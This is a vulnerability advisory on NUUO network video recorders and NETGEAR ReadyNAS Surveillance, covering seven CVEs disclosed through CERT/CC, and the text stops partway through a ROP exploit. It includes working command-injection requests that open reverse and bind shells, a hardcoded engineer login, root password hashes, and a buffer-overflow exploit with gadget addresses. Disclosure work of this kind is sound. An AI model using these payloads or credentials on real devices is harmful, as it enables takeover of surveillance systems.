""NVRsolo is NUUO’s answer to hassle free, lightweight NVR system. It is small in size yet able to handle heavy duty tasks. With local HDMI/VGA display and keyboard/mouse input built right into the unit, configuring NVRsolo is easy and simple. Built on solid Linux foundation, we sacrificed nothing except unnecessary bulk to make NVRsolo the award winning standalone NVR solution you have been looking for. NVRsolo's flexibility doesn't end there. For those needing more storage options, we offer 8 bay versions to meet your needs."" ""NUUO Crystal™ is the product that represents the next stage in VMS evolution. Rock solid, easily manageable, with powerful recording and viewing options available. Featuring revolutionary modular system structure that is made to handle large project size, NUUO Crystal™ is the ideal choice for your enterprise. Featuring technology that focuses on delivering stable video recording performance, recording failover, and 3rd party integration choice, you will be impressed with the stability and flexible options with NUUO Crystal™."" ""(ReadyNAS Surveillance) NETGEAR combines leading storage and switching solutions together with sophisticated network video recording software to provide an affordable and easy to install and manage surveillance solution. Small businesses and corporate branch offices require a secure way to protect physical assets, but may lack deep security expertise or a big budget. A user-friendly NVR system should combine fast and flexible configuration with easy operation. With a few simple steps for installation, the web-based management leads users to configure, monitor and playback video everywhere. UPnP search, auto camera detection and GUI schedule save setting-up time, while the easy drag and drop camera, auto scan, preset point patrolling, and multiple views offer users a prime monitoring experience.""   >> Summary: NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.  The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.  Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.  A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.   >> Technical details: #1 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5674 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):  function print_file($file_fullpath_name) {     $cmd = ""cat "" . $file_fullpath_name;     echo $file_fullpath_name . ""\n\n"";     system($cmd); }  <?php     if (isset($_GET['log']) && !empty($_GET['log']))     {         $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);         print_file($file_fullpath_name);     }     else     {         die(""unknown command."");     } ?>  The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept: - ReadyNAS Surveillance: GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,""192.168.1.204%3a9000"")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b' This will connect a shell back to 192.168.1.204 on port 9000, running as the ""admin"" user.  - NVRmini 2 and NVRsolo: GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998  This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.   #2 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5675 Attack Vector: Remote Constraints: Requires an administrator account Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):     else if ($act == 'update')     {         $cmd = sprintf(""/usr/bin/ntpdate %s"", $_GET['NTPServer']);                  $find_str = ""time server"";                  $sys_msg = system($cmd);         $pos = strpos($sys_msg, $find_str);  The file can only be accessed by an authenticted user. - ReadyNAS Surveillance: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test This will create a /tmp/test file with the contents of ""admin"" (current user).  - NVRmini 2 and NVRsolo: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f Connects a shell to 192.168.1.204, port 9000, running as root.  - Crystal: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26 Connects a shell to 192.168.1.204, port 4444, running as root.   #3 Vulnerability: Administrator password reset CVE-2016-5676 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.  Proof of concept: GET /cgi-bin/cgi_system?cmd=loaddefconfig  This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.   #4 Vulnerability: Information disclosure (system processes, available memory and filesystem status) CVE-2016-5677 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request: POST /__nvr_status___.php HTTP/1.1 username=nuuoeng&password=qwe23622260&submit=Submit   #5  Vulnerability: Harcoded root password  CVE-2016-5678 Affected products / versions: - NUUO NVRmini 2, firmware v1.0.0 to 3.0.0  - NUUO NVRsolo, firmware v1.0.0 to 3.0.0  The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.  NVRmini 2:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::  NVRsolo:   #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::   root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::     #6  Vulnerability: Command injection in cgi_main transfer license command CVE-2016-5679 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user Affected products / versions: - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The transfer_license command has a command injection vulnerability in the ""sn"" parameter: cgi_main?cmd=transfer_license&method=offline&sn="";<command>;#  Sample exploit for NVRmini2 (open bind shell on port 4444): GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23  NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.               #7  Vulnerability: Stack buffer overflow in cgi_main transfer license command CVE-2016-5680 Attack Vector: Local / Remote Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)  The ""sn"" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the ""sn"" parameter is copied directly into a string with a fixed length of 128 characters.  Function 0x20BC9C (NVRmini2 firmware v3.0.0):       method = getval(""method"");       sn = getval(""sn"");       (...)       memset(&command, 0, 128);       sprintf(&command, ""logger -p local0.info -t 'system' \""Activate license: %s\"""", sn);       system(&command);  > For example if the following request is performed: GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  > A core file is generated: Core was generated by `/NUUO/bin/cgi_main'. Program terminated with signal SIGSEGV, Segmentation fault. #0  0x61616160 in ?? () (gdb) i r r0             0x0	0 r1             0x0	0 r2             0x407aa4d0	1081779408 r3             0x407aa9e0	1081780704 r4             0x61616161	1633771873 r5             0x61616161	1633771873 r6             0x61616161	1633771873 r7             0x61616161	1633771873 r8             0x331fc8	3350472 r9             0x1	1 r10            0x33db54	3398484 r11            0x0	0 r12            0x1	1 sp             0xbedce528	0xbedce528 lr             0x61616161	1633771873 pc             0x61616160	0x61616160 cpsr           0x60000030	1610612784 (gdb)   The request can be sent by an HTTP GET or POST method.  > A few registers can be controlled with the sn parameter, as it can be seen in the diagram below for the NVRmini2: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4444555566667777PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 976 4444: r4 register content, offset 962 5555: r5 register content, offset 966 6666: r6 register content, offset 970 7777: r7 register content, offset 974 SSSS: start of stack pointer, offset 992  > On the ReadyNAS Surveillance one additional register (r8) can be controlled: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa44445555666677778888PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 986 4444: r4 register content, offset 968 5555: r5 register content, offset 970 6666: r6 register content, offset 974 7777: r7 register content, offset 978 8888: r8 register content, offset 982 SSSS: start of stack pointer, offset 1002  > Exploit mitigations and constraints The table below shows the exploit mitigation technologies for each target:          NVRmini2   ReadyNAS NX          Y          Y RELRO    Partial    Partial ASLR        N          Y  An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).  > Exploitation in the NVRmini2 (firmware v3.0.0): This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.  0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget) 0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system) 0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it) Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 (""nc -l -p 4444 -e /bin/sh &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}  Exploit for NVRmini2 firmware v3.0.0 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26  Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.  > Exploitation on ReadyNAS Surveillance (version v1.1.2): To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).  The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used: 0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1) 0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0) 0xb6ef91bc: fixed system() address when B6CCE000 is chosen 